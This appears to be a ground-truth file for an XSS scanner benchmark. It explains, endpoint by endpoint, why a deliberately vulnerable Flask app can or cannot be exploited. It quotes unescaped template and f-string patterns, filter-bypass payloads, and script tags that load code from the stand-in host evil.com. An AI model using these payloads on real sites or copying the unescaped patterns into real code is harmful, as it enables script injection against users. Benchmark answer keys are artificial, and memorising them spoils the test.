_meta.description: Authoritative endpoint vulnerability ground truth. Source: source code analysis of exploitable/app.py.
_meta.methodology: Each endpoint's source code was analyzed: (1) is the input HTML-escaped? (2) is the injection point in an executable context? (3) can standard XSS payloads trigger JS execution in modern browsers?

reflected-body.reasoning: Jinja2 template uses `{{ q | safe }}` — raw HTML injection. No escaping.

reflected-script.reasoning: Raw f-string injected into JS string literal: `var username = '{name}'`. No escaping.

reflected-attr-unquoted.reasoning: Raw f-string into unquoted HTML attribute: `style=background-color:{color}`. Event handlers execute.

reflected-href.reasoning: Raw f-string into href attribute. `javascript:` URIs execute when link is clicked.

reflected-iframe.reasoning: Raw f-string into iframe src attribute. `javascript:` URIs execute in iframe context.

reflected-multiparams.reasoning:
Raw f-string into HTML body `

a = {a}

` AND JS object `var debug = {a: "{a}"}`. No escaping.

reflected-meta.reasoning: Injected into `<meta http-equiv="refresh" content="5;url={redir}">`. Chrome and Firefox do NOT execute `javascript:` URIs in meta refresh context since ~2017.

bypass-double-encode.reasoning: Server double-decodes: `urllib.parse.unquote(q)` after Flask's single decode. Double-encoded scripts pass through and are reflected raw into HTML body via `_bypass_page()`.

bypass-quote-escape.reasoning: Escapes `"` and `'` but leaves angle brackets untouched. `` passes through unfiltered into raw HTML body.

bypass-blacklist.reasoning: Only strips literal ``. `` passes through unfiltered into raw HTML body.

bypass-case.reasoning: Blocks lowercase `<script>` but `<ScRiPt>alert(1)</ScRiPt>` passes through unfiltered into raw HTML body.

bypass-angle-only.reasoning: Strips `<` and `>` so no HTML tags possible. Input reflected into `data-value="{filtered}"` — can break out of attribute but `autofocus onfocus` doesn't work on `<div>` without `tabindex` in any modern browser.

bypass-waf-sim.reasoning: Blocks keywords: alert, prompt, confirm, eval, onerror, onload. But `<script>fetch('http://evil.com')</script>` or `<script src=//evil.com></script>` have NO blocked keywords and execute in HTML body.

mutation-innerhtml.reasoning: Server strips `<script>` tags AND `on*` attributes via regex. Sanitized output goes through `| tojson` (JSON encoding) before being set via `.innerHTML`. No `<script>` or event handlers survive. Standard mXSS vectors like SVG namespace tricks don't work because `on*` regex catches all event attributes.
